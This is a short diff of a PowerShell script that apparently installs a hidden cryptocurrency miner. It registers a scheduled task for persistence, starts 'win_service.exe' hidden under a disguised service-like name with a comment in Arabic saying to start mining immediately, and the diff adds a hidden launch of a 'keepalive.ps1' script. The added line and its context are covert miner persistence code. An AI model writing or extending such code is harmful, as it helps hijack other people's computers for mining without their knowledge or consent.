@@ -25,3 +25,5 @@ Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -
 
 # 7. تشغيل التعدين فوراً
 Start-Process -FilePath "$dir\win_service.exe" -ArgumentList "--config $dir\config.json" -WindowStyle Hidden
+
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -File `"$dir\keepalive.ps1`""
